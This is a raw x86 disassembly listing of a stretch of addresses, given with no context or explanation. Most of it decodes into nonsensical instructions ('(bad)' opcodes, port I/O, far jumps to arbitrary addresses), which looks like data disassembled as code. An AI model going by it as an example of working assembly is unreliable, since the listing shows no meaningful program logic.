  472cc5:	les    ecx,FWORD PTR [edi]
  472cc7:	xchg   ebp,eax
  472cc8:	add    ebp,ebx
  472cca:	dec    ecx
  472ccb:	ss je  0x472c4e
  472cce:	push   ebp
  472ccf:	(bad)  
  472cd0:	in     eax,dx
  472cd1:	out    dx,eax
  472cd2:	popa   
  472cd3:	jbe    0x472d4d
  472cd5:	dec    esp
  472cd6:	pop    ss
  472cd7:	jne    0x472ce9
  472cd9:	pop    ecx
  472cda:	addr16 add eax,0x21cc03c6
  472ce0:	inc    dx
  472ce2:	imul   eax,DWORD PTR cs:[esp+ecx*4-0x74],0x183de103
  472ceb:	add    eax,0x10fc24e
  472cf0:	retf   
  472cf1:	jl     0x472d61
  472cf3:	ja     0x472ca4
  472cf5:	xor    BYTE PTR [edi],dl
  472cf7:	add    ch,BYTE PTR ds:0x7bc68d31
  472cfd:	out    0x9e,al
  472cff:	icebp  
  472d00:	bound  ebp,QWORD PTR [edi+ebp*8]
  472d03:	mov    esi,0x75c0e011
  472d08:	adc    BYTE PTR [ebp+edx*1+0x48b0bee2],cl
  472d0f:	sar    ch,cl
  472d11:	aaa    
  472d12:	jmp    0x472d38
  472d14:	and    DWORD PTR [eax+eax*2-0x74a23f1a],ecx
  472d1b:	enter  0x8ad2,0x24
  472d1f:	adc    al,0x95
  472d21:	cmp    ah,dh
  472d23:	sub    eax,eax
  472d25:	mov    edi,0xf8bfc0cb
  472d2a:	or     eax,0xffffffff
  472d2d:	mov    esi,ebx
  472d2f:	mov    eax,0x6c03bebb
  472d34:	cmp    esi,0x2
  472d37:	ja     0x472d78
  472d39:	jo     0x472cbc
  472d3b:	loop   0x472d2d
  472d3d:	(bad)  
  472d3e:	(bad)  
  472d3f:	and    BYTE PTR [ebx],al
  472d41:	out    dx,al
  472d42:	(bad)  
  472d43:	inc    eax
  472d44:	ja     0x472d78
  472d46:	or     al,0xa0
  472d48:	push   0x3
  472d4a:	inc    eax
  472d4b:	mov    ecx,0xbe6a8097
  472d50:	sub    eax,0x5ef6cb80
  472d55:	or     BYTE PTR [ebx-0x75b37afc],cl
  472d5b:	push   eax
  472d5c:	push   cs
  472d5d:	mov    ch,0x40
  472d5f:	mov    DWORD PTR [edi+ebp*4+0x7bf74806],0x93920f68
  472d6a:	xor    esp,ecx
  472d6c:	push   es
  472d6d:	jae    0x472d71
  472d6f:	xchg   ecx,eax
  472d70:	jnp    0x472dbb
  472d72:	imul   esi,esi,0x1e
  472d75:	or     BYTE PTR [ebp+0x17],0x76
  472d79:	mov    edx,ss
  472d7b:	adc    eax,0x51cf407e
  472d80:	popa   
  472d81:	jle    0x472d8b
  472d83:	test   eax,0x1efebbdc
  472d88:	push   esi
  472d89:	add    BYTE PTR [ebx],ah
  472d8b:	jo     0x472daf
  472d8d:	jl     0x472d96
  472d8f:	(bad)  
  472d90:	or     al,0x0
  472d92:	and    al,0xac
  472d94:	mov    BYTE PTR fs:[ecx+0x506857b1],bh
  472d9b:	inc    eax
  472d9c:	sub    al,BYTE PTR [edi+ebp*2]
  472d9f:	sahf   
  472da0:	(bad)  
  472da1:	inc    ebp
  472da2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  472da3:	or     BYTE PTR [eax],0xc
  472da6:	sahf   
  472da7:	push   esi
  472da8:	call   0x32ff0c7d
  472dad:	fs jae 0x472dd8
  472db0:	das    
  472db1:	add    al,0x55
  472db3:	js     0x472e25
  472db5:	jp     0x472dc7
  472db7:	dec    ecx
  472db8:	retf   0x503f
  472dbb:	fwait
  472dbc:	nop
  472dbd:	es je  0x472df7
  472dc0:	push   ecx
  472dc1:	jne    0x472e13
  472dc3:	sbb    ebx,ebp
  472dc5:	rcr    DWORD PTR [edi+0x4b01c088],0x43
  472dcc:	mov    ch,0x8
  472dce:	cmp    al,0x2
  472dd0:	je     0x472dc4
  472dd2:	add    al,BYTE PTR [esi+0x1e600dc1]
  472dd8:	(bad)  
  472dd9:	jmp    0x2e089c85
  472dde:	rcl    DWORD PTR [ecx+0x75],cl
  472de1:	clc    
  472de2:	out    dx,eax
  472de3:	inc    esp
  472de4:	or     BYTE PTR [ebx+0x2900922f],0x8a
  472deb:	pop    esp
  472dec:	notrack jmp DWORD PTR [esi+0x1c]
  472df0:	(bad)  
  472df1:	ret    
  472df2:	jp     0x472e19
  472df4:	(bad)  
  472df6:	xchg   esp,eax
  472df7:	xlat   BYTE PTR ds:[bx]
  472df9:	scas   eax,DWORD PTR es:[edi]
  472dfa:	enter  0x6c6c,0x3f
  472dfe:	jne    0x472e06
  472e00:	dec    edi
  472e01:	dec    edi
  472e02:	push   eax
  472e03:	jg     0x472ddc
  472e05:	mov    ch,0x4
  472e07:	pop    ds
  472e08:	std    
  472e09:	mov    ebp,0xd39cfa47
  472e0e:	mov    eax,0x77f9880c
  472e13:	mov    BYTE PTR [esi],ch
  472e15:	sbb    al,0xee
  472e17:	jnp    0x472df3
  472e19:	and    al,0xce
  472e1b:	mov    edx,0x51c4b747
  472e20:	inc    edi
  472e21:	mov    cl,0x64
  472e23:	call   0x5844:0x673a5c39
  472e2a:	xor    eax,DWORD PTR [eax+0x35]
  472e2d:	sub    al,0xb9
  472e2f:	mov    eax,ds:0x78dbb069
  472e34:	jmp    0x472ded
  472e36:	outs   dx,DWORD PTR ds:[esi]
  472e37:	scas   eax,DWORD PTR es:[edi]
  472e38:	pusha  
  472e39:	hlt    
  472e3a:	add    al,0x70
  472e3c:	jle    0x472e92
  472e3e:	cdq    
  472e3f:	push   0xe2af004e
  472e44:	push   cs
  472e45:	jae    0x472e9c
  472e47:	add    BYTE PTR [edi+0x650dbb41],ch
  472e4d:	(bad)  
  472e4e:	xchg   ebp,eax
  472e4f:	sbb    BYTE PTR [eax-0x79],cl
  472e52:	adc    DWORD PTR [edi-0x4774cd2c],edi
  472e58:	ret    
  472e59:	ror    BYTE PTR [esi+0x2e],1
  472e5c:	or     al,0x30
  472e5e:	ret    
  472e5f:	push   0xffffffab
  472e61:	in     al,0x50
  472e63:	outs   dx,DWORD PTR ds:[esi]
  472e64:	cmc    
  472e65:	in     al,0x40
  472e67:	mov    ds:0xf8c5f8b7,al
  472e6c:	sub    eax,0xf86df7fc
  472e71:	xor    BYTE PTR [edx],dh
  472e73:	jae    0x472e80
  472e75:	js     0x472ed9
  472e77:	mov    dh,0x48
  472e79:	adc    al,0xfc
  472e7b:	psubsb mm3,QWORD PTR [edx-0x44]
  472e7f:	call   0x8b937041
  472e84:	dec    ebp
  472e85:	or     al,0x39
  472e87:	xchg   edx,eax
  472e88:	inc    cx
  472e8a:	sti    
  472e8b:	xor    dh,al
  472e8d:	adc    BYTE PTR [edi],cl
  472e8f:	loop   0x472ed4
  472e91:	bound  edi,QWORD PTR [edi-0x3e]
  472e94:	adc    BYTE PTR [esi-0x49],cl
  472e97:	pop    eax
  472e98:	(bad)  
  472e9a:	cli    
  472e9b:	mov    edi,eax
  472e9d:	mov    ebp,0xb8de32ff
  472ea2:	(bad)  
  472ea3:	adc    BYTE PTR [eax+0x1f],dh
  472ea6:	int3   
  472ea7:	lock sub eax,ecx
  472eaa:	mov    edi,edx
  472eac:	jle    0x472edd
  472eae:	lea    eax,[edi-0x1]
  472eb1:	daa    
  472eb2:	pop    ebx
  472eb3:	(bad)  
  472eb4:	rcr    BYTE PTR [edx],cl
  472eb6:	push   cs
  472eb7:	mov    ch,0xc7
  472eb9:	xchg   BYTE PTR [eax+0x5c],dh
  472ebc:	ja     0x472e4a
  472ebe:	adc    al,0x4b
  472ec0:	mul    DWORD PTR [esi-0x15]
  472ec3:	inc    edx
  472ec4:	call   0xf13eb89a
  472ec9:	retf   0xf889
  472ecc:	adc    al,0xc7
  472ece:	xchg   ebp,eax
  472ecf:	push   es
  472ed0:	add    DWORD PTR [eax],eax
  472ed2:	rcr    DWORD PTR [esi+0x5f],1
  472ed5:	ret    
  472ed6:	fsubr  QWORD PTR [edx]
  472ed8:	and    BYTE PTR [ebx-0x78],ch
  472edb:	test   eax,0x5e24acb
  472ee0:	and    edi,DWORD PTR [edi-0x51]
  472ee3:	xchg   edx,eax
  472ee4:	push   esp
  472ee5:	add    DWORD PTR [ecx+0x29],eax
  472ee8:	retf   
  472ee9:	pop    ecx
  472eea:	cli    
  472eeb:	mov    ecx,ebx
  472eed:	(bad)  [eax-0x29]
  472ef0:	ins    BYTE PTR es:[edi],dx
  472ef1:	sub    eax,0xad605b70
  472ef6:	les    eax,FWORD PTR [ebp-0x59ae68ef]
  472efc:	je     0x472f7a
  472efe:	stos   DWORD PTR es:[edi],eax
  472eff:	lods   al,BYTE PTR ds:[esi]
  472f00:	(bad)  
  472f01:	pop    ecx
  472f02:	adc    bh,BYTE PTR [ecx+0x64]
  472f05:	jne    0x472f1e
  472f07:	ins    DWORD PTR es:[edi],dx
  472f08:	outs   dx,DWORD PTR ds:[esi]
  472f09:	cwde   
  472f0a:	add    eax,0x63cf4d3a
  472f0f:	dec    edi
  472f10:	and    edx,DWORD PTR [edi+0x5fb51c1f]
  472f16:	xlat   BYTE PTR ds:[ebx]
  472f17:	mov    esi,eax
  472f19:	xor    edi,edx
  472f1b:	cwde   
  472f1c:	fst    QWORD PTR [ecx]
  472f1e:	push   DWORD PTR [ecx]
  472f20:	shl    bl,cl
  472f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  472f23:	mov    al,BYTE PTR [esi-0x1]
  472f26:	mov    bh,ah
  472f28:	lock xchg esi,eax
  472f2a:	inc    edi
  472f2b:	fistp  QWORD PTR [eax]
  472f2d:	jno    0x472f5e
  472f2f:	je     0x472f52
  472f31:	dec    edx
  472f32:	jnp    0x472f92
  472f34:	cmp    dl,0x4
  472f37:	(bad)  
  472f39:	adc    DWORD PTR [edx+edi*8+0x747820ea],esp
  472f40:	fld    TBYTE PTR [edi+0x69]
  472f43:	cmp    BYTE PTR cs:[ebx+0x31d680d7],al
  472f4a:	ror    BYTE PTR [ecx],0x2f
  472f4d:	push   es
  472f4e:	and    ebx,eax
  472f50:	adc    eax,0xe0f987d9
  472f56:	mov    al,BYTE PTR [edi]
  472f58:	add    BYTE PTR [esi],bh
  472f5a:	int3   
  472f5b:	dec    esp
  472f5c:	jmp    0x472f6a
  472f5e:	test   al,al
  472f60:	shl    BYTE PTR [esi+0x6c],0x9
  472f64:	adc    cl,BYTE PTR [edx]
  472f66:	call   DWORD PTR [ebp+0x12bf60f8]
  472f6c:	mov    al,BYTE PTR [eax]
  472f6e:	cmp    dl,al
  472f70:	jne    0x472f5e
  472f72:	push   cs
  472f73:	out    dx,eax
  472f74:	push   ebx
  472f75:	pop    esp
  472f76:	inc    esp
  472f77:	and    ecx,0xfe40356d
  472f7d:	stos   BYTE PTR es:[edi],al
  472f7e:	pop    ebp
  472f7f:	sti    
  472f80:	mov    cl,0xbf
  472f82:	rcr    DWORD PTR [ecx+0x49],0x74
  472f86:	cs mov esi,ecx
  472f89:	mov    edi,ebx
  472f8b:	pop    ds
  472f8c:	sub    ecx,esi
  472f8e:	jbe    0x472fad
  472f90:	sbb    al,0x9
  472f92:	(bad)  
  472f93:	mov    al,0x62
  472f95:	lea    ebx,[esi+0x7c]
  472f98:	(bad)  
  472f99:	lods   al,BYTE PTR ds:[esi]
  472f9a:	in     al,dx
  472f9b:	adc    DWORD PTR [ecx+0x2d1a57c8],ecx
  472fa1:	sub    eax,0x894028de
  472fa6:	shl    DWORD PTR [ebp-0x13],0xa8
  472faa:	icebp  
  472fab:	xchg   BYTE PTR [esi-0x7420859f],al
  472fb1:	push   esp
  472fb2:	sbb    BYTE PTR [esi+0x41],dh
  472fb5:	test   eax,0x4c04abb
  472fba:	pusha  
  472fbb:	add    BYTE PTR [edi],0x3
  472fbe:	pop    ebx
  472fbf:	fild   WORD PTR [ebx+0x2558bb2c]
  472fc5:	ret    0x76b5
  472fc8:	pop    edx
  472fc9:	lahf   
  472fca:	lods   al,BYTE PTR ds:[esi]
  472fcb:	mov    cs,WORD PTR [edi+edx*2]
  472fce:	inc    ecx
  472fcf:	dec    edi
  472fd0:	sbb    eax,0xc98590cd
  472fd5:	hlt    
  472fd6:	ret    
  472fd7:	lock inc esi
  472fd9:	idiv   DWORD PTR [ebx+0x8]
  472fdc:	les    edi,FWORD PTR [esi+0x43]
  472fdf:	mov    esi,0x2ca494b3
  472fe4:	push   ds
  472fe5:	jl     0x472f72
  472fe7:	adc    BYTE PTR [edx+0x67],al
  472fea:	mov    fs:0xd5d8c76f,al
  472ff0:	outs   dx,DWORD PTR ds:[esi]
  472ff1:	rol    BYTE PTR [ecx],0x7a
  472ff4:	mov    bl,bh
  472ff6:	pop    ds
  472ff7:	jbe    0x472ffe
  472ff9:	mov    ebx,0xaf81291f
  472ffe:	dec    edi
  472fff:	mov    ch,0xd3
  473001:	dec    edx
  473002:	fwait
  473003:	sub    al,0x3c
  473005:	add    DWORD PTR [ebp+0x66],esi
  473008:	les    esi,FWORD PTR [ebx]
  47300a:	ficomp DWORD PTR [edi-0x5f]
  47300d:	and    dh,dl
  47300f:	xchg   ebx,eax
  473010:	mov    BYTE PTR [esp+ebx*1],0x3a
  473014:	(bad)  
  473015:	lock loope 0x472fee
  473018:	lods   al,BYTE PTR ds:[esi]
  473019:	inc    edx
  47301a:	and    BYTE PTR [edx],cl
  47301c:	and    al,0x6
  47301e:	and    BYTE PTR [edx-0x59e9f43],dh
  473024:	add    esi,DWORD PTR [eax+edx*2-0x30d765f1]
  47302b:	mov    ecx,DWORD PTR ds:0x77d27354
  473031:	mov    edi,0x3974d2
  473036:	je     0x473044
  473038:	mov    ebx,DWORD PTR ds:0xff1b8b15
  47303e:	rcr    DWORD PTR [ebx+0x21],cl
  473041:	pusha  
  473042:	rol    DWORD PTR ds:0xcf5b6f,0xe0
  473049:	add    eax,0x94d7fd48
  47304e:	push   ebx
  47304f:	xor    al,0x50
  473051:	sub    ebp,ecx
  473053:	sub    cl,BYTE PTR [eax]
  473055:	dec    edx
  473056:	into   
  473057:	mov    eax,0x1e30074f
  47305c:	(bad)  
  47305d:	add    ecx,DWORD PTR [ebp+edi*2-0x8]
  473061:	adc    eax,0x81d0441
  473066:	mov    fs,WORD PTR [esi]
  473068:	fdivrp st(5),st
  47306a:	or     ch,dl
  47306c:	ror    BYTE PTR ds:0x3cac093e,cl
  473072:	and    eax,0x754aaae8
  473077:	repz fimul WORD PTR [esi]
  47307a:	test   eax,0x2e2bc48a
  47307f:	cmp    BYTE PTR [edi+0x63],bh
  473082:	sub    al,0xf2
  473084:	fistp  QWORD PTR [edi-0x3716abcb]
  47308a:	dec    BYTE PTR [eax+ebp*8+0x3ce74588]
  473091:	sub    eax,0xdc2a0575
  473096:	lods   al,BYTE PTR ds:[esi]
  473097:	fdivr  st,st(6)
  473099:	fidivr DWORD PTR [edi-0x36]
  47309c:	jl     0x47307c
  47309e:	cmp    al,0x3a
  4730a0:	jne    0x4730ac
  4730a2:	cs hlt 
  4730a4:	and    bl,cl
  4730a6:	lods   al,BYTE PTR ds:[esi]
  4730a7:	jmp    0x47308a
  4730a9:	adc    ah,al
  4730ab:	mov    ebx,0xb6cf22de
  4730b0:	aaa    
  4730b1:	cmp    al,0x2e
  4730b3:	sub    al,BYTE PTR [esi-0x48]
  4730b6:	sub    bl,ah
  4730b8:	mov    DWORD PTR [ebp-0x28],esi
  4730bb:	call   0x21dba870
  4730c0:	jge    0x4730e8
  4730c2:	pop    edx
  4730c3:	mov    eax,DWORD PTR [esi+0x66]
  4730c6:	jae    0x4730e7
  4730c8:	pop    ebp
  4730c9:	outs   dx,DWORD PTR ds:[esi]
  4730ca:	scas   eax,DWORD PTR es:[edi]
  4730cb:	xor    bl,bl
  4730cd:	cmp    BYTE PTR [ebp-0x19],0x94
  4730d1:	or     ch,BYTE PTR [ecx]
  4730d3:	retf   0x9873
  4730d6:	sar    DWORD PTR [esi-0x5c],1
  4730d9:	lock mov bh,0x7d
  4730dc:	fadd   DWORD PTR [edi+0x20b017d9]
  4730e2:	rep stos BYTE PTR es:[edi],al
  4730e4:	sbb    esi,DWORD PTR [ebx]
  4730e6:	cmp    DWORD PTR [ebp-0x10],0xffffffff
  4730ea:	shr    BYTE PTR [eax+0x4d524610],0x7b
  4730f1:	lock pop edx
  4730f3:	pop    ecx
  4730f4:	mov    edx,DWORD PTR [edi+0x49]
  4730f7:	fld    TBYTE PTR [ebx-0x64]
  4730fa:	jmp    0x3ccf56b1
  4730ff:	sub    al,BYTE PTR [edx]
  473101:	xor    BYTE PTR [edx+0x3d],dh
  473104:	push   cs
  473105:	dec    BYTE PTR [ebx-0x4]
  473108:	cmp    al,0x39
  47310a:	ja     0x473145
  47310c:	imul   ebx,ebx,0xf302cf0
  473112:	mov    dh,0xc0
  473114:	add    ebx,eax
  473116:	and    al,BYTE PTR [ebx]
  473118:	xor    BYTE PTR [edx],ah
  47311a:	shr    BYTE PTR [ebp-0x1c],1
  47311d:	pop    eax
  47311e:	dec    edi
  47311f:	ss push ds
  473121:	shl    BYTE PTR [ecx-0x4d],0xb
  473125:	add    bh,BYTE PTR [edi+0x12]
  473128:	dec    DWORD PTR [esi]
  47312a:	cld    
  47312b:	or     al,0x80
  47312d:	jl     0x473141
  47312f:	jg     0x473161
  473131:	fsub   DWORD PTR [esp+esi*8-0x3d]
  473135:	je     0x47313f
  473137:	xchg   ebx,eax
  473138:	ret    
  473139:	and    al,0xdf
  47313b:	mov    BYTE PTR [ecx*8-0x23e5374],dh
  473142:	cmp    dl,BYTE PTR [eax+0x5d]
  473145:	pop    esp
  473146:	jnp    0x473140
  473148:	in     eax,dx
  473149:	scas   eax,DWORD PTR es:[edi]
  47314a:	jne    0x473158
  47314c:	lea    esi,[esi+ebx*8]
  47314f:	mov    eax,DWORD PTR [esi]
  473151:	call   0x5195:0x24ff0456
  473158:	mov    eax,0xcf3e06e2
  47315d:	mov    ebx,0x8e1b95cf
  473162:	push   ss
  473163:	push   es
  473164:	dec    ebx
  473165:	ret    
  473166:	mov    ds:0x3bcf3c8e,eax
  47316b:	imul   BYTE PTR [edi]
  47316d:	pop    es
  47316e:	pop    esp
  47316f:	ss xchg esi,ebx
  473172:	sub    bl,BYTE PTR [edx+0x4b]
  473175:	jmp    0xac559517
  47317a:	sbb    BYTE PTR [ebp+0x0],0x27
  47317e:	hlt    
  47317f:	hlt    
  473180:	jg     0x4731d5
  473182:	mov    dh,0x5a
  473184:	fsubr  DWORD PTR [ecx]
  473186:	shr    DWORD PTR [ecx],1
  473188:	rcr    esi,1
  47318a:	mov    al,ds:0x74a7fce0
  47318f:	lea    esi,[ebp-0x49]
  473192:	and    al,0xdc
  473194:	xchg   ebx,eax
  473195:	xchg   esi,eax
  473196:	xor    ah,bh
  473198:	dec    ebp
  473199:	mov    edx,0xf44e980
  47319e:	test   BYTE PTR [eax],dh
  4731a0:	cmc    
  4731a1:	xchg   edx,eax
  4731a2:	fwait
  4731a3:	push   edx
  4731a4:	imul   eax,DWORD PTR [esi],0x221a3201
  4731aa:	or     bl,cl
  4731ac:	imul   ebx,DWORD PTR [edi-0x14ebaa1a],0x5ca76ab3
  4731b6:	cmp    DWORD PTR [eax],esp
  4731b8:	aas    
  4731b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4731ba:	outs   dx,BYTE PTR ds:[esi]
  4731bb:	adc    BYTE PTR [ebx-0x72],ch
  4731be:	hlt    
  4731bf:	xor    ah,0xe9
  4731c2:	jg     0x47317c
  4731c4:	add    DWORD PTR [edx+0x1a],esi
  4731c7:	and    BYTE PTR [ebp-0x6f],bh
  4731ca:	cmp    cl,0x53
  4731cd:	jne    0x675909a2
  4731d3:	js     0x47317c
  4731d5:	ret    
  4731d6:	sbb    eax,0x86e16662
  4731db:	push   edi
  4731dc:	inc    ebx
  4731dd:	call   0xc2d04158
  4731e2:	aad    0xcc
  4731e4:	mov    eax,ds:0x8beccea
  4731e9:	lock jmp 0x473236
  4731ec:	xor    ecx,ecx
  4731ee:	inc    ecx
  4731ef:	inc    ecx
  4731f0:	hlt    
  4731f1:	lods   al,BYTE PTR ds:[esi]
  4731f2:	icebp  
  4731f3:	outs   dx,BYTE PTR ds:[esi]
  4731f4:	add    BYTE PTR [edi+0x3debc820],bh
  4731fa:	mov    esi,0x56645d0
  4731ff:	mov    esi,0x94e24630
  473204:	outs   dx,DWORD PTR ds:[esi]
  473205:	xor    edx,DWORD PTR [esi+0x75]
  473208:	cld    
  473209:	aas    
  47320a:	and    DWORD PTR [ecx+edi*8-0x26],esi
  47320e:	imul   BYTE PTR [ebx+0x22]
  473211:	cld    
  473212:	call   esi
  473214:	pop    ebx
  473215:	js     0x473203
  473217:	mov    DWORD PTR [ebx+ecx*1+0x77],edi
  47321b:	add    eax,0x6001d515
  473220:	add    BYTE PTR [edx-0x256663cc],dh
  473226:	js     0x473263
  473228:	dec    ebp
  473229:	fdiv   QWORD PTR [edi-0x80]
  47322c:	or     ch,BYTE PTR [edi-0x61fc0117]
  473232:	push   0xffffffa4
  473234:	shl    BYTE PTR ds:[esi],cl
  473237:	jecxz  0x4731ba
  473239:	cmp    cl,ch
  47323b:	stos   DWORD PTR es:[edi],eax
  47323c:	mov    edx,0xb8f9894f
  473241:	pop    edi
  473242:	ds push eax
  473244:	leave  
  473245:	jecxz  0x473227
  473247:	rol    BYTE PTR [ecx],0x5d
  47324a:	lods   eax,DWORD PTR ds:[esi]
  47324b:	out    0xe9,al
  47324d:	inc    ebx
  47324e:	push   0x77
  473250:	sbb    eax,0x270b7ba
  473255:	mov    bh,0x0
  473257:	outs   dx,BYTE PTR ds:[esi]
  473258:	mov    bl,0xcd
  47325a:	aaa    
  47325b:	fistp  QWORD PTR [esi+0x3f7447c2]
  473261:	mov    bl,0x1
  473263:	or     al,0x45
  473265:	je     0x47329f
  473267:	mov    bl,0x2
  473269:	inc    esi
  47326a:	je     0x47327e
  47326c:	mov    bl,0x3
  47326e:	dec    esi
  47326f:	maskmovq mm4,(bad)
  473270:	mul    DWORD PTR [edi+0x4df474bd]
  473276:	jl     0x473202
  473278:	mov    bl,0x4
  47327a:	mov    eax,0x39587612
  47327f:	pop    eax
  473280:	lock (bad) 
  473282:	lock ret 0x2576
  473286:	mov    edx,0x1b7536b2
  47328b:	xchg   esi,eax
  47328c:	adc    eax,0xd0ddc488
  473291:	inc    ebx
  473292:	mov    ds:0x3badcdc,al
  473297:	clc    
  473298:	adc    BYTE PTR [esi+0x3d],0xbe
  47329c:	clc    
  47329d:	adc    bl,BYTE PTR [esi-0x48]
  4732a0:	lss    edx,FWORD PTR [eax+0x55]
  4732a4:	dec    ebp
  4732a5:	sar    esi,1
  4732a7:	loopne 0x473240
  4732a9:	mov    edx,esi
  4732ab:	inc    esp
  4732ac:	iret   
  4732ad:	dec    ecx
  4732ae:	and    esp,0x6f4f4c1
  4732b4:	mov    dh,0xf8
  4732b6:	xchg   edi,eax
  4732b7:	ret    
  4732b8:	xor    ah,al
  4732ba:	and    eax,0xc0f158ca
  4732bf:	jmp    0xc2e6:0x3e9fccc2
  4732c6:	inc    edx
  4732c7:	popa   
  4732c8:	mov    ch,0xe7
  4732ca:	(bad)  
  4732cb:	xor    al,BYTE PTR [edx+0xc]
  4732ce:	cmc    
  4732cf:	inc    ebp
  4732d0:	sub    BYTE PTR [eax-0x8],dh
  4732d3:	clc    
  4732d4:	jne    0x4732ea
  4732d6:	(bad)  
  4732d7:	xchg   ecx,eax
  4732d8:	push   eax
  4732d9:	push   edi
  4732da:	mov    BYTE PTR [eax-0x5f59453d],cl
  4732e0:	sbb    al,0x4e
  4732e2:	call   0x193939b0
  4732e7:	inc    ebx
  4732e8:	dec    edi
  4732e9:	mov    al,0x89
  4732eb:	sahf   
  4732ec:	xor    ebp,esi
  4732ee:	sub    ebx,DWORD PTR [edx+esi*8+0x51]
  4732f2:	pop    edi
  4732f3:	add    al,0xf1
  4732f5:	jb     0x47335e
  4732f7:	xchg   edi,eax
  4732f8:	inc    edx
  4732f9:	push   0x8b9d1797
  4732fe:	xlat   BYTE PTR ds:[ebx]
  4732ff:	sub    al,0x5
  473301:	sbb    DWORD PTR [eax-0x69],ebp
  473304:	or     BYTE PTR [edx-0x4e],ch
  473307:	add    dl,bh
  473309:	lods   al,BYTE PTR ds:[esi]
  47330a:	xchg   ecx,edx
  47330c:	push   ss
  47330d:	and    BYTE PTR [eax],0x1b
  473310:	pop    ds
  473311:	rol    BYTE PTR [esi],1
  473313:	jne    0x4732ea
  473315:	(bad)  
  473316:	pop    edx
  473317:	push   cs
  473318:	jns    0x4732f1
  47331a:	lods   al,BYTE PTR ds:[esi]
  47331b:	cmp    al,BYTE PTR [ebp+0x4f9dd67d]
  473321:	cmp    eax,0x1d287da4
  473326:	xor    esp,DWORD PTR [ebp+0x7f]
  473329:	in     al,0xee
  47332b:	clc    
  47332c:	dec    ebp
  47332d:	cld    
  47332e:	lea    eax,[ebp+0x5f78eff8]
  473334:	add    eax,0xfe6c86e4
  473339:	push   ss
  47333a:	(bad)  
  47333c:	pop    ss
  47333d:	fsub   QWORD PTR [ebp+0x4830fbb5]
  473343:	cmp    edi,eax
  473345:	jl     0x47338d
  473347:	jmp    0x47337b
  473349:	add    ebp,DWORD PTR [edi]
  47334b:	jns    0x473367
  47334d:	pop    ds
  47334e:	mov    DWORD PTR [ebp+0x80f6ddd],0x6489db0
  473358:	xchg   ecx,eax
  473359:	out    dx,al
  47335a:	mov    esi,0xc77d75fb
  473360:	pop    esi
  473361:	xlat   BYTE PTR ds:[ebx]
  473362:	or     ecx,DWORD PTR [edi]
  473364:	lea    edx,[ebp+0x5e8d9ad9]
  47336a:	js     0x47338c
  47336c:	iret   
  47336d:	int    0x5f
  47336f:	das    
  473370:	mov    ds:0x567e064c,al
  473375:	xor    esi,esi
  473377:	stos   BYTE PTR es:[edi],al
  473378:	or     BYTE PTR [esi-0x17fa0052],bh
  47337e:	add    cl,BYTE PTR [edx]
  473380:	pushf  
  473381:	jge    0x473389
  473383:	mov    al,0x2d
  473385:	neg    edx
  473387:	jmp    0x47338f
  473389:	or     ah,ah
  47338b:	or     BYTE PTR [edx],dh
  47338d:	pusha  
  47338e:	xchg   esi,edi
  473390:	mov    al,ah
  473392:	stos   BYTE PTR es:[edi],al
  473393:	xchg   edx,eax
  473394:	push   eax
  473395:	mov    ebx,esp
  473397:	into   
  473398:	mov    dh,0x74
  47339a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47339b:	push   DWORD PTR [edi-0x18]
  47339e:	sbb    eax,0x431388d4
  4733a3:	dec    ecx
  4733a4:	enter  0x9ed,0xc9
  4733a8:	jg     0x473393
  4733aa:	dec    ebx
  4733ab:	mov    al,BYTE PTR [ebx]
  4733ad:	stos   BYTE PTR es:[edi],al
  4733ae:	cmp    ebx,esp
  4733b0:	mov    WORD PTR [eax],?
  4733b2:	mov    ds:0x58f875f1,eax
  4733b7:	pop    esi
  4733b8:	(bad)  
  4733b9:	aam    0xc2
  4733bb:	out    dx,eax
  4733bc:	add    bh,BYTE PTR [esi+edx*1]
  4733bf:	xor    ah,BYTE PTR [eax-0x425d379]
  4733c5:	mov    al,ds:0x5f2f0f86
  4733ca:	outs   dx,BYTE PTR ds:[esi]
  4733cb:	out    0xfa,eax
  4733cd:	mov    eax,ds:0xa0f42e80
  4733d2:	test   bl,dh
  4733d4:	mov    al,ds:0x7fc7f285
  4733d9:	mov    ah,0x6
  4733db:	sbb    al,0x14
  4733dd:	mov    ebp,0x7500a313
  4733e2:	cmp    BYTE PTR [eax+0x26178b1d],ah
  4733e8:	xchg   BYTE PTR [edx],al
  4733ea:	jge    0x4733f4
  4733ec:	mov    es,ebp
  4733ee:	(bad)  
  4733ef:	jae    0x47338c
  4733f1:	jle    0x4733f8
  4733f3:	xrelease mov DWORD PTR [esp+ebp*4-0x71],edx
  4733f8:	shr    DWORD PTR [edi],0xa1
  4733fb:	daa    
  4733fc:	pushf  
  4733fd:	adc    BYTE PTR [edx],al
  4733ff:	jb     0x473404
  473401:	fmul   QWORD PTR [edx+0x41e1bda0]
  473407:	sahf   
  473408:	test   dl,cl
  47340a:	jge    0x473408
  47340c:	movzx  edx,WORD PTR [esi]
  47340f:	sub    eax,0x24ef8e7f
  473414:	loop   0x47348a
  473416:	jae    0x473432
  473418:	int3   
  473419:	sub    BYTE PTR cs:[ebx],0x8d
  47341d:	mov    ah,0x10
  47341f:	xor    dl,bl
  473421:	jmp    0xbbd9546f
  473426:	in     al,dx
  473427:	mov    ecx,0x7516ab33
  47342c:	push   esp
  47342d:	xchg   BYTE PTR ds:0x5d1cd7fc,ch
  473433:	adc    BYTE PTR [esi-0x4b218bff],dl
  473439:	mov    ch,0x7f
  47343b:	or     BYTE PTR [edi+esi*2],al
  47343e:	or     DWORD PTR [edi],ecx
  473440:	mov    edi,0x7eb43b70
  473445:	add    cl,BYTE PTR [edx]
  473447:	lea    ebx,[ebx*4+0x2be05c0c]
  47344e:	jmp    0xff08:0x1b365d5d
  473455:	ror    DWORD PTR [eax+0x4fdef2fc],cl
  47345b:	and    bh,ah
  47345d:	pop    edx
  47345e:	cmp    ecx,0x39
  473461:	xor    al,0x95
  473463:	push   es
  473464:	int3   
  473465:	jge    0x47343b
  473467:	mov    edi,0x49933679
  47346c:	dec    esi
  47346d:	inc    esi
  47346e:	dec    esi
  47346f:	inc    ecx
  473470:	dec    esi
  473471:	lods   al,BYTE PTR ds:[esi]
  473472:	or     BYTE PTR [edx],cl
  473474:	xor    BYTE PTR [esi-0x25],cl
  473477:	pusha  
  473478:	mov    ah,0x36
  47347a:	(bad)  
  47347b:	jge    0x473453
  47347d:	lock jo 0x47342a
  473480:	ret    
  473481:	std    
  473482:	mov    bh,0xab
  473484:	or     al,0xdb
